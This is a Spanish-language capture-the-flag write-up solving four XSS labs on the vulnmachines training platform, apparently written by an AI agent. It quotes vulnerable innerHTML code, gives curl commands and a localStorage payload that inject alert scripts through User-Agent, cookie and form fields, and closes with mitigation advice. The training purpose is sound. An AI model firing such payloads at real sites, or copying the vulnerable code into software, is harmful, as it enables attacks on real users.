# Solución - Reto XSS de Vulnmachines

## Resumen

He completado exitosamente el análisis y explotación de las vulnerabilidades XSS en los laboratorios de vulnmachines.com. A continuación, detallo las vulnerabilidades encontradas y cómo explotarlas.

## Laboratorios Resueltos

### Lab-01: XSS mediante User-Agent
**Pista:** "User agent Will Help You!"

**Vulnerabilidad:** El servidor refleja el header User-Agent sin sanitización.

**Exploit:**
```bash
curl -H "User-Agent: <script>alert('XSS')</script>" http://hackme1.vulnmachines.com/xss/Lab-01.php
```

### Lab-02: XSS mediante Cookie
**Pista:** "Cookie Will Help You!"

**Vulnerabilidad:** El servidor refleja el valor de la cookie "alert-labs" sin sanitización.

**Exploit:**
```bash
curl -H "Cookie: alert-labs=<script>alert('XSS')</script>" http://hackme1.vulnmachines.com/xss/Lab-02.php
```

### Lab-03: DOM-based XSS mediante localStorage
**Pista:** "Local storage Will Help You!"

**Vulnerabilidad:** La aplicación usa innerHTML para insertar el valor de localStorage.getItem("alert-labs") sin sanitización.

**Código vulnerable:**
```javascript
document.getElementById("content").innerHTML = "<span style=\"font-size:0.4em;\"> LocalStorage will help You: </span><br>" + localStorage.getItem("alert-labs") + "";
```

**Exploit:** Para explotar esta vulnerabilidad, se debe ejecutar en la consola del navegador:
```javascript
localStorage.setItem("alert-labs", "<img src=x onerror=alert('XSS')>");
// Luego recargar la página
```

### Lab-04: Stored XSS
**Pista:** "Try with Stored XSS"

**Vulnerabilidad:** El formulario almacena el input del usuario en la base de datos sin sanitización y lo muestra a todos los usuarios.

**Exploit:**
```bash
curl -X POST -d "fname=<script>alert('XSS')</script>" http://hackme1.vulnmachines.com/xss/Lab-04.php
```

## Técnicas Utilizadas

1. **Reflected XSS**: Labs 1 y 2 - El input del usuario se refleja inmediatamente en la respuesta
2. **DOM-based XSS**: Lab 3 - La vulnerabilidad existe en el código JavaScript del cliente
3. **Stored XSS**: Lab 4 - El payload malicioso se almacena en el servidor y afecta a todos los usuarios

## Recomendaciones de Mitigación

1. **Sanitización de entrada**: Validar y sanitizar todos los inputs del usuario
2. **Encoding de salida**: Usar funciones de escape apropiadas (htmlspecialchars en PHP)
3. **Content Security Policy (CSP)**: Implementar headers CSP restrictivos
4. **Usar textContent en lugar de innerHTML**: Para evitar DOM-based XSS
5. **Validación del lado del servidor**: Nunca confiar solo en validación del cliente